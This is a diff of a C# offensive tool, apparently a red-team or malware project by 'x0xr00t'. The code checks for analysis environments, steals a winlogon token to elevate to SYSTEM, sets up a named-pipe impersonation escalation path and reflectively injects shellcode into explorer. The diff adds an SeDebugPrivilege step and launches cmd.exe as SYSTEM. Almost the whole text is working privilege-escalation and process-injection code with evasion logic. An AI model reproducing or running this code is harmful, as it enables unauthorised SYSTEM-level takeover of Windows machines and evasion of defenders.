@@ -33,127 +33,153 @@ using System.IO;
 [assembly: AssemblyMetadata("FanMotto3", "x0xr00t: 'Stay sl0ppy. Stay curious. Keep the terminal glowing.'")]
 [assembly: AssemblyMetadata("FanMotto4", "x0xr00t: 'No magic here, just suspicious amounts of printf().'")]
 [assembly: AssemblyCopyright("Copyright © 2026 x0xr00t. All rights reserved. Analysts: No rights reserved.")]
-
-public class Program
-{
-    private static readonly byte K1 = 0xDE;
-    private static readonly byte K2 = 0xAD;
-
-    #region Win32 API - NT AUTHORITY\SYSTEM & Injection
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
-
-    [DllImport("advapi32.dll", SetLastError = true)]
-    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
-
-    [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
-
-    [DllImport("advapi32.dll", SetLastError = true)]
-    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);
-
-    [DllImport("advapi32.dll", SetLastError = true)]
-    private static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);
-
-    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
-
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-
-    [DllImport("kernel32.dll")]
-    private static extern IntPtr GetConsoleWindow();
-
-    [DllImport("user32.dll")]
-    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    [return: MarshalAs(UnmanagedType.Bool)]
-    public static extern bool CloseHandle(IntPtr hObject);
-
-    // Constants
-    const uint TOKEN_DUPLICATE = 0x0002;
-    const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
-    const uint TOKEN_QUERY = 0x0008;
-    const uint TOKEN_ALL_ACCESS = 0xF01FF;
-    const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
-    const uint PROCESS_VM_OPERATION = 0x0008;
-    const uint PROCESS_VM_WRITE = 0x0020;
-    const uint PROCESS_VM_READ = 0x0010;
-    const uint PROCESS_CREATE_THREAD = 0x0002;
-    const uint PROCESS_QUERY_INFORMATION = 0x0400;
-    const uint PROCESS_DUP_HANDLE = 0x0040;
-    const uint MEM_COMMIT = 0x00001000;
-    const uint MEM_RESERVE = 0x00002000;
-    const uint PAGE_EXECUTE_READWRITE = 0x40;
-    const uint PIPE_ACCESS_DUPLEX = 0x00000003;
-    const uint PIPE_TYPE_BYTE = 0x00000000;
-    const uint PIPE_READMODE_BYTE = 0x00000000;
-    const uint PIPE_WAIT = 0x00000000;
-    const int SW_SHOW = 5;
-    const int SW_HIDE = 0;
-    const int SECURITY_IMPERSONATION_LEVEL = 2;
-    const int TokenPrimary = 1;
-    #endregion
-
-    private static string D(string b64)
+    
+    public class Program
     {
-        byte[] d = Convert.FromBase64String(b64);
-        for (int i = 0; i < d.Length; i++) { d[i] ^= K1; d[i] ^= K2; }
-        return Encoding.UTF8.GetString(d);
-    }
+        private static readonly byte K1 = 0xDE;
+        private static readonly byte K2 = 0xAD;
 
-    public static void Main(string[] args)
-    {
-        try
+        #region Win32 API - NT AUTHORITY\SYSTEM & Injection
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
+
+        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool CloseHandle(IntPtr hObject);
+
+        // Constants
+        const uint TOKEN_DUPLICATE = 0x0002;
+        const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
+        const uint TOKEN_QUERY = 0x0008;
+        const uint TOKEN_ALL_ACCESS = 0xF01FF;
+        const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
+        const uint PROCESS_VM_OPERATION = 0x0008;
+        const uint PROCESS_VM_WRITE = 0x0020;
+        const uint PROCESS_VM_READ = 0x0010;
+        const uint PROCESS_CREATE_THREAD = 0x0002;
+        const uint PROCESS_QUERY_INFORMATION = 0x0400;
+        const uint PROCESS_DUP_HANDLE = 0x0040;
+        const uint MEM_COMMIT = 0x00001000;
+        const uint MEM_RESERVE = 0x00002000;
+        const uint PAGE_EXECUTE_READWRITE = 0x40;
+        const uint PIPE_ACCESS_DUPLEX = 0x00000003;
+        const uint PIPE_TYPE_BYTE = 0x00000000;
+        const uint PIPE_READMODE_BYTE = 0x00000000;
+        const uint PIPE_WAIT = 0x00000000;
+        const int SW_SHOW = 5;
+        const int SW_HIDE = 0;
+        const int SECURITY_IMPERSONATION_LEVEL = 2;
+        const int TokenPrimary = 1;
+        #endregion
+
+        private static string D(string b64)
         {
-            // 1. Discovery / Easter Eggs
-            if (CheckDefenseEnvironment()) { TriggerEasterEgg(); return; }
-            if (IsAnalystEnvironment()) { TriggerAnalystEasterEgg(); return; }
-            if (IsMSRCEnvironment()) { TriggerMSRCEasterEgg(); return; }
-
-            // Check for sl0ppy tools/fans
-            if (IsSloppyFanEnvironment()) { TriggerSloppyFanEasterEgg(); return; }
-
-            // 2. Show Red Team Easter Egg by default on normal Windows systems
-            IntPtr consoleHandle = GetConsoleWindow();
-            if (consoleHandle != IntPtr.Zero)
-            {
-                ShowWindow(consoleHandle, SW_SHOW);
-                TriggerRedTeamEasterEgg();
-                Thread.Sleep(3000);
-                ShowWindow(consoleHandle, SW_HIDE);
-            }
-
-            // 3. Anti-Analysis Stealth
-            if (Environment.ProcessorCount < 2) return;
-
-            // 4. Elevate to SYSTEM via Token Stealing (Winlogon)
-            ElevateToSystem();
-
-            // 5. Start Named Pipe Backup for extra persistence/escalation
-            Thread pipeThread = new Thread(() => NamedPipeSystemEscalation());
-            pipeThread.IsBackground = true;
-            pipeThread.Start();
-
-            // 6. Reflective Injection as SYSTEM
-            byte[] shellcode = { 0x90, 0x90, 0x90 };
-            ReflectiveInjectIntoExplorer(shellcode);
+            byte[] d = Convert.FromBase64String(b64);
+            for (int i = 0; i < d.Length; i++) { d[i] ^= K1; d[i] ^= K2; }
+            return Encoding.UTF8.GetString(d);
         }
-        catch { }
-    }
+
+        public static void Main(string[] args)
+        {
+            try
+            {
+                // 1. Discovery / Easter Eggs
+                if (CheckDefenseEnvironment()) { TriggerEasterEgg(); return; }
+                if (IsAnalystEnvironment()) { TriggerAnalystEasterEgg(); return; }
+                if (IsMSRCEnvironment()) { TriggerMSRCEasterEgg(); return; }
+
+                // Check for sl0ppy tools/fans
+                if (IsSloppyFanEnvironment()) { TriggerSloppyFanEasterEgg(); return; }
+
+                // 2. Show Red Team Easter Egg by default on normal Windows systems
+                IntPtr consoleHandle = GetConsoleWindow();
+                if (consoleHandle != IntPtr.Zero)
+                {
+                    ShowWindow(consoleHandle, SW_SHOW);
+                    TriggerRedTeamEasterEgg();
+                    Thread.Sleep(3000);
+                    ShowWindow(consoleHandle, SW_HIDE);
+                }
+
+                // 3. Anti-Analysis Stealth
+                if (Environment.ProcessorCount < 2) return;
+
+                // 4. Elevate to SYSTEM via Token Stealing (Winlogon)
+                ElevateToSystem();
+
+                // 5. Start Named Pipe Backup for extra persistence/escalation
+                Thread pipeThread = new Thread(() => NamedPipeSystemEscalation());
+                pipeThread.IsBackground = true;
+                pipeThread.Start();
+    
+                // 6. Reflective Injection as SYSTEM
+                byte[] shellcode = { 0x90, 0x90, 0x90 };
+                ReflectiveInjectIntoExplorer(shellcode);
+            }
+            catch { }
+        }
 
     private static void ElevateToSystem()
     {
+        // 1. Schakel eerst SeDebugPrivilege in om toegang tot winlogon te garanderen
+        IntPtr hOwnToken = IntPtr.Zero;
+        try
+        {
+            if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hOwnToken))
+            {
+                LUID luid;
+                if (LookupPrivilegeValue(null, "SeDebugPrivilege", out luid))
+                {
+                    TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES
+                    {
+                        PrivilegeCount = 1,
+                        Luid = luid,
+                        Attributes = SE_PRIVILEGE_ENABLED
+                    };
+                    AdjustTokenPrivileges(hOwnToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
+                }
+            }
+        }
+        catch { }
+        finally
+        {
+            if (hOwnToken != IntPtr.Zero) CloseHandle(hOwnToken);
+        }
+
+        //   2. Originele token-duplicatie en impersonatie + CreateProcess uitbreiding
         IntPtr hToken = IntPtr.Zero;
         IntPtr hProcess = IntPtr.Zero;
         try
@@ -167,9 +193,26 @@ public class Program
             if (OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, out hToken))
             {
                 IntPtr duplicatedToken = IntPtr.Zero;
-                if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, IntPtr.Zero, SECURITY_IMPERSONATION_LEVEL, TokenPrimary, out duplicatedToken))
+            // SECURITY_IMPERSONATION_LEVEL = 2, TokenPrimary = 1
+                if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, IntPtr.Zero, 2, 1, out duplicatedToken))
                 {
+                    // Actie A: Huidige thread impersoneren
                     ImpersonateLoggedOnUser(duplicatedToken);
+
+                    // Actie B: Volledig nieuw proces (CMD) starten als SYSTEM
+                    STARTUPINFO si = new STARTUPINFO();
+                    si.cb = (uint)Marshal.SizeOf(si);
+                    si.lpDesktop = "WinSta0\\Default"; // Zorgt ervoor dat de GUI zichtbaar is
+
+                    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+                
+                    // Lanceren van het subproces met het SYSTEM-token
+                    if (CreateProcessWithTokenW(duplicatedToken, 1, null, "cmd.exe", 0, IntPtr.Zero, null, ref si, out pi))
+                    {
+                        CloseHandle(pi.hProcess);
+                        CloseHandle(pi.hThread);
+                    }
+
                     if (duplicatedToken != IntPtr.Zero) CloseHandle(duplicatedToken);
                 }
             }
@@ -181,6 +224,7 @@ public class Program
             if (hProcess != IntPtr.Zero) CloseHandle(hProcess);
         }
     }
+
 
 private static void NamedPipeSystemEscalation()
 {
